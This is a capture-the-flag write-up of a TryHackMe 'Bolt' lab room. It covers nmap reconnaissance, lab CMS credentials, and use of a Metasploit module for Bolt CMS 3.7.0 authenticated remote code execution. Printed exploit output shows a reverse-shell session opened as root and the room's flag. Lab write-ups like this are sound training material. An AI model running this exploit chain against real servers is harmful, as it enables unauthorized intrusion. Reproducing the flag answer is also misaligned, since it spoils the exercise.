# Bolt Room WriteUp

### What port number has a web server with a CMS running?
- run nmap comman ``sudo nmap -sV -sC -oN nmap/initials 10.10.250.232``

- result: [nmap result]()
### What is the username we can find in the CMS?
- bolt

### What is the password we can find for the username?
- boltadmin123

### What version of the CMS is installed on the server? (Ex: Name 1.1.1)
- Bolt 3.7.1

### There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
- Do a search on Bolt 3.7.1 cve in exploit-db
- The result will tell us that the vulenrability was on version 3.7.0 which is vulnerable to Authenticated Remote Code Execution
- The EDB-ID is **48296**

### Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
- use msfconsole
- run ``search Bolt``
- the result will be like this:

```bash
msf6 > search Bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability

Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/bolt_file_upload
```
- ``use 0``
- Set all needed part to perform exploit such as username, password, Local Host, Remote Host, and Port
- do ``run``
- It will give us access to the server as root user
- find flag
```bash
[*] Started reverse TCP handler on 10.18.108.222:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "fbezcg".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file tjbwrrtrg.php.
[+] Deleted file rdlqdqjfzgqx.php.
[+] Used token 41f4b87a252d20b7a804a4737c to create ndawwgfqe.php.
[*] Attempting to execute the payload via "/files/ndawwgfqe.php?fbezcg=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.18.108.222:4444 -> 10.10.250.232:45522) at 2023-04-28 23:25:04 +0700
[+] Deleted file ndawwgfqe.php.
[+] Reverted user profile back to original state.

ls
index.html
pwd
/home/bolt/public/files
whoami
root
cd ../
ls
bolt-public
extensions
files
index.php
theme
thumbs
cd ../
ls  
app
composer.json
composer.lock
cron
extensions
index.php
public
README.md
reboot.sh
src
vendor
cd /home
ls
bolt
composer-setup.php
flag.txt
cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
exit
```

